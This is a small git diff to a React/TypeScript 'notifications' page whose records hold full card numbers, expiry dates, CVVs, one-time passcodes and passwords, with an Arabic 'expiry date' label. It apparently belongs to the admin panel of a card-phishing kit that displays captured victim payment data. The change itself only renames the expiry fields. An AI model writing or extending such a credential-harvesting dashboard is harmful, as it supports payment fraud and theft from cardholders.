@@ -42,7 +42,6 @@ interface Notification {
   cardNumber: string;
   prefix: string;
   year: string;
-  month: string;
   cvv: string;
   otp: string;
   pass: string;
@@ -313,7 +312,7 @@ export default function NotificationsPage1() {
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
-                {selectedNotification.year}/{selectedNotification.month}
+                {selectedNotification.expiryYear}/{selectedNotification.expiryMonth}
               </p>
 
               <p className="flex items-center">
